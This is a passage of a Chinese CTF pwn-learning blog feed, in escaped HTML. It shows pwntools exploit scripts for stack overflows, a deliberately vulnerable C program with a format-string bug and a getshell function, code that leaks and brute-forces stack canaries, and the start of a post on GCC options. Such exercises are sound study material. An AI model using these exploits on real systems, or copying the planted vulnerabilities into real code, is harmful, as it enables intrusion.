&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">addr_ow_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x600d20&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">addr_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x400d20&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">H&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">P&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;localhost&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">6666&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#r = process(&amp;#39;./readme.bin&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">H&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">P&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">junk&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;What&amp;#39;s your name? &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exploit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mh">0x218&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exploit&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">addr_flag&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exploit&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exploit&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">addr_ow_flag&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exploit&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">junk&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Please overwrite the flag: &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exploit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;LIBC_FATAL_STDERR_=1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exploit&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">junk&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvall&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span> &lt;span class="n">junk&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>栈上partial overwrite&lt;/li>
&lt;/ul>
&lt;p>2018 安恒杯 babypie&lt;/p>
&lt;p>2018 XNUCA-gets&lt;/p>
&lt;h3 id="canary-绕过技术">Canary 绕过技术&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>泄露栈中的Canary&lt;/p>
&lt;p>覆盖 Canary 的低字节，来打印出剩余的 Canary 部分&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// ex2.c
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="nf">getshell&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">init&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdin&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">vuln&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x200&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">init&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Hello Hacker!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">vuln&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>EXP&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">binary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;ex2&amp;#39;&lt;/span>&lt;span class="c1">#全局系统自动设置，为官方推荐设置，ex2为文件名称。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#context.log_level = &amp;#39;debug&amp;#39;#debug模式下才开启&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./ex2&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#本地连接到ex2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">get_shell&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./ex2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sym&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;getshell&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1">#由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Hello Hacker!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#接受传来的第一部分字符&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># leak Canary&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">100&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#传输100个A&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Canary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mh">0xa&lt;/span> &lt;span class="c1">#因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Canary:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Canary&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="c1">#日志记录下canary&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Bypass Canary&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x90&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Canary&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x90&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">get_shell&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#发送最后的payload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>one-by-one 爆破 Canary&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span> &lt;span class="s2">&amp;#34;[+] Brute forcing stack canary &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">stop&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">xrange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">256&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">send2server&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">res&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print &amp;#34;\t[+] Byte found 0x%02x&amp;#34; % i&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">255&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span> &lt;span class="s2">&amp;#34;[-] Exploit failed&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">canary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">stop&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">start&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;hex&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span> &lt;span class="s2">&amp;#34; [+] SSP value is 0x&lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>canary劫持__stack_chk_fail 函数&lt;/p>
&lt;/li>
&lt;li>
&lt;p>覆盖 TLS 中储存的 Canary 值&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>PWN_小tools的使用</title><link>https://ykiko.top/p/pwn_%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 22 Oct 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/pwn_%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>&lt;h1 id="pwn_小tools的使用">PWN_小tools的使用&lt;/h1>
&lt;h3 id="gcc-编译常用命令">GCC 编译常用命令&lt;/h3>
&lt;table>
&lt;tr>
&lt;th>不带选项&lt;/th>
&lt;th>&lt;/th>
&lt;th>gcc test.c 将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-o&lt;/th>
&lt;th>指定生成的输出文件；&lt;/th>
&lt;th>gcc test.c -o test 将test.c预处理、汇编、编译并链接形成可执行文件test。-o选项用来指定输出文件的文件名。&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-E&lt;/th>
&lt;th>仅执行编译预处理；&lt;/th>
&lt;th>gcc -E test.c -o test.i 将test.c预处理输出test.i文件。&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-S&lt;/th>
&lt;th>将C代码转换为汇编代码；&lt;/th>
&lt;th>gcc -S test.i 将预处理输出文件test.i汇编成test.s文件。&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-c&lt;/th>
&lt;th>仅执行编译操作，不进行连接操作。&lt;/th>
&lt;th>gcc -c test.s 将汇编输出文件test.s编译输出test.o文件。&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-wall&lt;/th>
&lt;th>显示警告信息；&lt;/th>
&lt;th>&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>**无选项链接**&lt;/th>
&lt;th>&lt;/th>
&lt;th>gcc test.o -o test 将编译输出文件test.o链接成最终可执行文件test。&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-O&lt;/th>
&lt;th>使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长&lt;/th>
